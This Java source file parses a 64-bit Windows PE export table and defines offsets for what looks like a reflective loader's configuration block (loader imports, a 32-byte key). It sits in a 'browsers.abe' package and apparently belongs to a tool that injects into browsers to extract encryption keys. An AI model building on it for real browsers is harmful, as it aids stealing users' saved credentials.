package noface.browsers.abe;

import java.nio.ByteBuffer;
import java.nio.ByteOrder;
import java.nio.charset.StandardCharsets;

final class Pe {

    static final int MARKER = 0x28;
    static final int STATUS = 0x29;
    static final int READY = 0x01;
    static final int ERR = 0x2A;
    static final int HR = 0x2C;
    static final int COM = 0x30;
    static final int KEY = 0x40;
    static final int KEY_LEN = 32;

    static final int IMP_LOAD = 0x40;
    static final int IMP_GET = 0x48;
    static final int IMP_ALLOC = 0x50;
    static final int IMP_PROT = 0x58;
    static final int IMP_FLUSH = 0x60;

    static int exportOff(byte[] pe, String name) {
        ByteBuffer buf = ByteBuffer.wrap(pe).order(ByteOrder.LITTLE_ENDIAN);
        if (pe.length < 0x40 || buf.getShort(0) != 0x5A4D) {
            throw new IllegalArgumentException("dos");
        }
        int peOff = buf.getInt(0x3C);
        if (peOff + 24 > pe.length || buf.getInt(peOff) != 0x00004550) {
            throw new IllegalArgumentException("pe");
        }
        if (buf.getShort(peOff + 24) != 0x20B) {
            throw new IllegalArgumentException("pe32+");
        }
        int opt = peOff + 24;
        int expRva = buf.getInt(opt + 112);
        int expSize = buf.getInt(opt + 116);
        if (expRva == 0 || expSize == 0) throw new IllegalArgumentException("no export");
        short nSec = buf.getShort(peOff + 6);
        int sect = opt + buf.getShort(peOff + 20);
        int rva = namedExport(pe, buf, nSec, sect, expRva, name);
        int file = rvaToFile(buf, nSec, sect, rva);
        if (file < 0) throw new IllegalArgumentException("map");
        return file;
    }

    private static int namedExport(byte[] pe, ByteBuffer buf, int nSec, int sect, int expRva, String want) {
        int ed = rvaToFile(buf, nSec, sect, expRva);
        if (ed < 0) throw new IllegalArgumentException("ed");
        int numNames = buf.getInt(ed + 24);
        int addrFuncs = buf.getInt(ed + 28);
        int addrNames = buf.getInt(ed + 32);
        int addrOrds = buf.getInt(ed + 36);
        int namesOff = rvaToFile(buf, nSec, sect, addrNames);
        int funcsOff = rvaToFile(buf, nSec, sect, addrFuncs);
        int ordsOff = rvaToFile(buf, nSec, sect, addrOrds);
        for (int i = 0; i < numNames; i++) {
            int nameRva = buf.getInt(namesOff + i * 4);
            int nameOff = rvaToFile(buf, nSec, sect, nameRva);
            if (nameOff < 0) continue;
            if (!want.equals(cstr(pe, nameOff))) continue;
            int ord = buf.getShort(ordsOff + i * 2) & 0xFFFF;
            return buf.getInt(funcsOff + ord * 4);
        }
        throw new IllegalArgumentException("export");
    }

    private static int rvaToFile(ByteBuffer buf, int nSec, int sect, int rva) {
        for (int i = 0; i < nSec; i++) {
            int off = sect + i * 40;
            int virtSize = buf.getInt(off + 8);
            int virtAddr = buf.getInt(off + 12);
            int rawSize = buf.getInt(off + 16);
            int rawPtr = buf.getInt(off + 20);
            int size = Math.max(virtSize, rawSize);
            if (rva >= virtAddr && rva < virtAddr + size) {
                return rva - virtAddr + rawPtr;
            }
        }
        return -1;
    }

    private static String cstr(byte[] data, int off) {
        int end = off;
        while (end < data.length && data[end] != 0) end++;
        return new String(data, off, end - off, StandardCharsets.US_ASCII);
    }

    static void put64(byte[] buf, int off, long value) {
        ByteBuffer.wrap(buf, off, 8).order(ByteOrder.LITTLE_ENDIAN).putLong(value);
    }

    private Pe() {}
}
